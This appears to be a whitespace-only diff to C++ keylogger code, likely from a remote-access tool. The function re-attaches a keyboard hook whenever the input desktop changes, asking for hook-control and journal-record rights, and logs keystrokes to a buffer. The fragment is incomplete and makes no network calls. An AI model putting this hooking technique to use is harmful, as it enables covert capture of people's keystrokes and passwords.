@@ -560,18 +560,18 @@ DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
         clock_t now = clock();
         if (now - lastCheck > 1000) {
             lastCheck = now;
-			HDESK hInputDesk = IsDesktopChanged(desktop, DESKTOP_READOBJECTS | 
-                DESKTOP_WRITEOBJECTS | DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD);
-			if (hInputDesk) {
-				ReleaseHook();
-				if (desktop) {
-					CloseDesktop(desktop);
-				}
-				desktop = hInputDesk;
-				if (!SetThreadDesktop(desktop)) {
-					Mprintf("SetThreadDesktop failed: %d\n", GetLastError());
-				}
-			}
+            HDESK hInputDesk = IsDesktopChanged(desktop, DESKTOP_READOBJECTS |
+                                                DESKTOP_WRITEOBJECTS | DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD);
+            if (hInputDesk) {
+                ReleaseHook();
+                if (desktop) {
+                    CloseDesktop(desktop);
+                }
+                desktop = hInputDesk;
+                if (!SetThreadDesktop(desktop)) {
+                    Mprintf("SetThreadDesktop failed: %d\n", GetLastError());
+                }
+            }
         }
         if (!SetHook(WriteBuffer, pThis->m_Buffer)) {
             return -1;
